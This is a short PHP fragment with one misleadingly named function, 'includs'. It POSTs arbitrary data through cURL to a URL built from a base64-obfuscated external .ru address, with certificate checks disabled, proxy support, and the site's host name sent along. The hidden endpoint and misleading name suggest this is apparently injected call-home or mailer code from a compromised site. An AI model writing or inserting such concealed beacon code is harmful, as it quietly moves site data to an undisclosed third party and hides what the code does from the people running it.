<?php function includs($u, $d, $b=0,$prx=NULL){global $s;$ffo='aHR0cHM6Ly9iaW1haWxlci5ydS';$tmo=mysqli_fetch_assoc(mysqli_query($s,"SHOW VARIABLES WHERE Variable_name='wait_timeout'"));$tmo=$tmo['Value']<15?($tmo['Value']-1):15;$u=$b==1?base64_decode($ffo.'9mb3Itc2NyaXB0Lw==').$u:$u;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $u);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_REFERER, $_SERVER["HTTP_HOST"]);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($d, '', '&'));curl_setopt($ch, CURLOPT_PROXY, $prx);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);curl_setopt($ch, CURLOPT_POSTREDIR, 1);@curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_MAXREDIRS, 15);curl_setopt($ch, CURLOPT_TIMEOUT,$tmo);if(!$sata = curl_exec($ch)){return false;}curl_close($ch);return $sata;}